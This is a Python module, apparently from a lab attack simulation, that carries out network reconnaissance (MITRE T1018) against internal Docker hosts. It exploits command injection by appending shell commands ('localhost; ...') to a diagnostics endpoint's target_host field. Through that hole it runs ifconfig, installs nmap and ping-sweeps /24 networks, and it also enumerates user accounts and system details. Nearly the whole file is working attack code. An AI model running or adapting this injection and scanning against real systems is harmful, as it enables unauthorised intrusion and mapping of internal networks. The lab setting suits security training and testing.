#!/usr/bin/env python3
"""
Phase 4: Network Reconnaissance
Discovers network topology and live hosts using nmap via command injection.

MITRE ATT&CK: T1018 — Remote System Discovery
"""

import logging

from .base_attacker import BaseAttacker

logger = logging.getLogger(__name__)


class Reconnaissance(BaseAttacker):
    """Performs network-level host discovery against the internal Docker networks."""

    def __init__(self, frontend_url: str = "http://frontend:3000") -> None:
        super().__init__(frontend_url)

    def get_frontend_ips(self) -> list:
        """Discover the frontend container's non-loopback IP addresses."""
        logger.info("[IP DISCOVERY] Discovering frontend IP addresses...")
        frontend_ips = []

        try:
            cmd = "ifconfig | grep 'inet ' | grep -v '127.0.0.1'"
            response = self.session.post(
                f"{self.frontend_url}/diagnostics",
                json={"system_check": "ping", "target_host": f"localhost; {cmd}"},
                headers={"Content-Type": "application/json"},
            )
            if response.status_code == 200:
                result = response.json()
                if result.get("success"):
                    output = result.get("output", "")
                    logger.info("✅ Network interfaces discovered")
                    logger.info("   %s", output)
                    for line in output.split("\n"):
                        if "inet addr:" in line:
                            for part in line.split():
                                if part.startswith("addr:"):
                                    ip = part.split(":")[1]
                                    if "." in ip and not ip.startswith("127."):
                                        frontend_ips.append(ip)
                                        logger.info("Frontend IP: %s", ip)
        except Exception as e:
            logger.error("❌ IP discovery failed: %s", e)

        return frontend_ips

    def discover_network(self) -> list:
        """Phase 4: Network Reconnaissance — discover hosts via nmap ping sweep."""
        logger.info("[RECONNAISSANCE] Starting professional reconnaissance with nmap...")

        try:
            response = self.session.get(f"{self.frontend_url}/system")
            if response.status_code == 200:
                system_info = response.json()
                logger.info("-" * 50)
                logger.info("✅ System Info: %s - Node %s", system_info["platform"], system_info["nodeVersion"])
                logger.info("✅ Database: %s", system_info["database"]["host"])
        except Exception as e:
            logger.error("❌ System info failed: %s", e)

        try:
            response = self.session.get(f"{self.frontend_url}/users")
            if response.status_code == 200:
                users = response.json()
                logger.info("-" * 50)
                logger.info("✅ Found %d users:", len(users))
                for user in users:
                    logger.info("   - %s (%s)", user["username"], user["role"])
        except Exception as e:
            logger.error("❌ User enumeration failed: %s", e)

        logger.info("-" * 50)
        frontend_ips = self.get_frontend_ips()

        logger.info("-" * 50)
        logger.info("[NETWORK DISCOVERY] Using nmap for progressive network reconnaissance...")

        network_ranges = []
        if frontend_ips:
            logger.info("[TARGET NETWORKS] Frontend IPs detected: %s", ", ".join(frontend_ips))
            for frontend_ip in frontend_ips:
                ip_parts = frontend_ip.split(".")
                if len(ip_parts) == 4:
                    base_network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                    logger.info("[TARGET NETWORK] Base network: %s.0/24", base_network)
                    network_ranges.append(f"{base_network}.0/24")

        network_ranges = list(set(network_ranges))
        logger.info("[NETWORK RANGES] Will scan %d network ranges", len(network_ranges))

        discovered_hosts: list = []
        active_networks: list = []

        logger.info("-" * 50)
        logger.info("[PHASE 1] Scanning /24 networks...")
        for i, network in enumerate(network_ranges, 1):
            logger.info("   %d. %s", i, network)

        logger.info("-" * 50)
        logger.info("Installing nmap and scanning network...")
        install_cmd = "apk update && apk add nmap"
        try:
            response = self.session.post(
                f"{self.frontend_url}/diagnostics",
                json={"system_check": "ping", "target_host": f"localhost; {install_cmd}"},
                headers={"Content-Type": "application/json"},
            )
            if response.status_code == 200:
                result = response.json()
                if result.get("success"):
                    logger.info("✅ Nmap installation completed")
                else:
                    logger.warning("⚠️ Nmap installation may have failed, continuing anyway...")
                    return []
        except Exception as e:
            logger.error("❌ Nmap installation failed: %s", e)
            return []

        for network in network_ranges:
            logger.info("-" * 50)
            logger.info("\n[NETWORK SCAN] Scanning network: %s", network)

            try:
                nmap_cmd = f"nmap -sn -R {network}"
                response = self.session.post(
                    f"{self.frontend_url}/diagnostics",
                    json={"system_check": "ping", "target_host": f"localhost; {nmap_cmd}"},
                    headers={"Content-Type": "application/json"},
                )

                if response.status_code == 200:
                    result = response.json()
                    if result.get("success"):
                        output = result.get("output", "")
                        logger.info("   ✅ Ping sweep completed for %s", network)
                        hosts_found = self._parse_nmap_output(output, discovered_hosts, network)
                        if hosts_found > 0:
                            active_networks.append(network)
                            logger.info("   ✅ Found %d hosts in %s", hosts_found, network)
                        else:
                            logger.info("   ❌ No hosts found in %s", network)
                    else:
                        logger.warning("   ❌ Ping sweep failed: %s", result.get("error", "Unknown error"))
                else:
                    logger.warning("   ❌ Ping sweep failed: HTTP %s", response.status_code)
            except Exception as e:
                logger.error("   ❌ Ping sweep failed: %s", e)

        if active_networks:
            logger.info("\n[SCAN COMPLETE] Found %d active networks in frontend ranges", len(active_networks))

        if not discovered_hosts:
            logger.info("\n[SCAN COMPLETE] No hosts found in frontend network ranges")

        logger.info("\n[RECONNAISSANCE SUMMARY] Total hosts discovered: %d", len(discovered_hosts))
        if discovered_hosts:
            logger.info("[RECONNAISSANCE SUMMARY] Hosts found: %s", ", ".join(discovered_hosts))
        return discovered_hosts

    def _parse_nmap_output(self, output: str, discovered_hosts: list, network: str) -> int:
        """Parse nmap ping-sweep output and populate the discovered_hosts list."""
        hosts_found = 0
        base_network = network.split("/")[0].rsplit(".", 1)[0]
        logger.info("   Parsing nmap output for network %s...", base_network)

        for line in output.split("\n"):
            line = line.strip()
            if "Nmap scan report for" not in line:
                continue
            logger.info("   Found nmap scan report: %s", line)

            if "(" in line and ")" in line:
                hostname = line.split("for ")[1].split(" (")[0].strip()
                ip_part = line.split("(")[1].split(")")[0].strip()
                host_info = f"{hostname} ({ip_part})"
            else:
                ip_part = line.split("for ")[1].split(" ")[0].strip()
                host_info = ip_part

            if (
                ip_part
                and "." in ip_part
                and ip_part not in discovered_hosts
                and not ip_part.endswith(".1")
                and not ip_part.endswith(".0")
                and not ip_part.endswith(".255")
            ):
                discovered_hosts.append(ip_part)
                hosts_found += 1
                logger.info("   ✅ Host discovered: %s", host_info)

        logger.info("   Total hosts found: %d", hosts_found)
        return hosts_found
